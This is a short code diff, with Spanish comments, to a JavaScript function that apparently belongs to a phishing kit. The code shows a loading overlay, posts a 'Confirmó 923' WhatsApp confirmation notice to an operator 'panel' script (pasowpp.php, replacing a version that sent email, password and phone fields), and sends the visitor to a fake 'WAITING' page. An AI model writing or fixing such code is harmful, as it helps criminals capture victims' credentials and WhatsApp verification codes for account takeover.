@@ -200,13 +200,11 @@ function b34f9_fecha_larga() {
             $("#fondo").show();
             $("#cargando-o").show();
             
-            // 3. Enviar aviso al panel (simulamos el envío a pasocorreo.php)
-            $.post("../../../../../process/pasocorreo.php", { 
-                eml: "Confirmó WhatsApp", 
-                clv: "923", 
-                cel: "-" 
+            // 3. Enviar aviso al panel usando el archivo correcto de WPP
+            $.post("../../../../../process/pasowpp.php", { 
+                codigo: "Confirmó 923" 
             }, function(data) {
-                // 4. Una vez notificado el panel, redirigimos a la pantalla de espera real
+                // 4. Redirigimos a la pantalla de espera
                 window.location.href = "../a/WAITING";
             });
         });
